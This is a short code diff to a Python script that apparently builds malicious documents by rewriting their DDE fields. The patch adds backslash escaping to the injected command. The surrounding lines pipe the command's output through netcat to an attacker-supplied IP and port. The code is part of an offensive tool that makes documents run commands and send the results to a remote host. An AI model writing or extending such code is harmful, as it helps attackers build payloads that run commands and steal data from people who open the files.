@@ -10,6 +10,7 @@ def extract_dde(data):
     return data[dde_index:dde_end]
 
 def rewrite_dde(data, command, ip, port):
+    command = command.replace("\\", "\\\\")
     if ip and port:
         command = "{} | nc {} {}".format(command, ip, port)
     command = command.encode("utf-8")
